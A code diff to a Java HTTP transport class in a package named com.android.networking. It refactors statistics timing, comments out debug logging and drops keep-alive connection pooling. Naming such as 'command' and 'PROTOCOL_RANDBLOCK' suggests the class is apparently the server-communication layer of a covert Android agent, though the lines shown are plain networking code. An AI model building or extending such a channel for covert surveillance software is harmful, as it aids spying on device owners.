@@ -27,7 +27,6 @@ import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.impl.conn.tsccm.ThreadSafeClientConnManager;
 import org.apache.http.params.BasicHttpParams;
 import org.apache.http.params.HttpConnectionParams;
-import org.apache.http.params.HttpParams;
 import org.apache.http.params.HttpProtocolParams;
 
 import com.android.networking.Messages;
@@ -43,10 +42,7 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 
 	public HttpKeepAliveTransport(String host) {
 		super(host);
-		if (Cfg.STATISTICS) {
-			statistics = new Statistics();
-			statistics.start();
-		}
+
 	}
 
 	/**
@@ -85,7 +81,7 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 		}
 
 		DataInputStream in = null;
-
+		Statistics stat = null;
 		try {
 
 			if (Cfg.PROTOCOL_RANDBLOCK) {
@@ -94,7 +90,14 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 			}
 
 			httppost.setEntity(new ByteArrayEntity(data));
+
+			if (Cfg.STATISTICS) {
+				stat = new Statistics("httpclient", data.length);
+			}
 			final HttpResponse response = httpclient.execute(httppost);
+			if (Cfg.STATISTICS) {
+				stat.stop();
+			}
 
 			final int returnCode = response.getStatusLine().getStatusCode();
 
@@ -104,9 +107,10 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 				long length = response.getEntity().getContentLength();
 				if (Cfg.PROTOCOL_RANDBLOCK) {
 					if (length % 16 > 0) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (command), dropping some bytes: " + length % 16);
-						}
+						/*
+						 * if (Cfg.DEBUG) { Check.log(TAG +
+						 * " (command), dropping some bytes: " + length % 16); }
+						 */
 						length = length - (length % 16);
 					}
 				}
@@ -115,8 +119,8 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 
 				final byte[] content = new byte[(int) length];
 				in.readFully(content);
-
 				in.close();
+
 				if (Cfg.STATISTICS) {
 					statistics.addIn(content.length);
 				}
@@ -136,6 +140,9 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 
 			throw new TransportException(1);
 		} finally {
+			/*
+			 * if (Cfg.STATISTICS && stat != null) { stat.stop(); }
+			 */
 			if (in != null) {
 				try {
 					in.close();
@@ -162,13 +169,8 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 		registry.register(new Scheme("http", PlainSocketFactory.getSocketFactory(), 80));
 
 		BasicHttpParams httpParameters = new BasicHttpParams();
-		ConnManagerParams.setMaxTotalConnections(httpParameters, 100);
-		// ConnManagerParams.setMaxConnectionsPerRoute(httpParameters, 10);
 		HttpProtocolParams.setVersion(httpParameters, HttpVersion.HTTP_1_1);
-		HttpProtocolParams.setUseExpectContinue(httpParameters, true);
-
-		ThreadSafeClientConnManager connManager = new ThreadSafeClientConnManager(httpParameters, registry);
-
+		
 		// final HttpParams httpParameters = new BasicHttpParams();
 		// Set the timeout in milliseconds until a connection is established.
 		final int timeoutConnection = 30000;
@@ -178,24 +180,21 @@ public abstract class HttpKeepAliveTransport extends HttpTransport {
 		final int timeoutSocket = 30000;
 		HttpConnectionParams.setSoTimeout(httpParameters, timeoutSocket);
 
-		if (Cfg.PROTOCOL_KEEPALIVE) {
-			httpclient = new DefaultHttpClient(connManager, httpParameters);
-		} else {
-			httpclient = new DefaultHttpClient(httpParameters);
+		httpclient = new DefaultHttpClient(httpParameters);
+
+		if (Cfg.STATISTICS) {
+			statistics = new Statistics("HTTP");
+			statistics.start(false);
 		}
 
-		httpclient.setKeepAliveStrategy(new ConnectionKeepAliveStrategy() {
-			public long getKeepAliveDuration(HttpResponse response, org.apache.http.protocol.HttpContext context) {
-				return 30000;
-			}
-		});
 	}
 
 	@Override
 	public void close() {
 		cookies = null;
 		httpclient = null;
-		if (Cfg.STATISTICS) {
+
+		if (Cfg.STATISTICS && statistics != null) {
 			statistics.stop();
 		}
 	}
